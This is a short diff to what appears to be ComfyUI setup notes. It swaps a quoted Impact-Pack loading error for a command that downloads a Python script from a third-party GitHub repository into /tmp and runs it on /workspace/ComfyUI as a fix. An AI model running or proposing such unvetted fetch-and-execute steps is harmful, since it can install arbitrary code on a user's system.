@@ -1,6 +1,2 @@
-Loading aborted due to error reloading workflow data
-TypeError: t.findInputSlot is not a function
-
-This may be due to the following script:
-
-/extensions/ComfyUI-Impact-Pack/impact-pack.js
+curl -fL https://raw.githubusercontent.com/simbo1005/AI1-Model-Grabber-Vast/2dbd950871a47003c7635f7a93ee7c2a588890c9/launcher/impact_compat.py -o /tmp/dsnn-impact-fix.py &&
+python3 /tmp/dsnn-impact-fix.py /workspace/ComfyUI
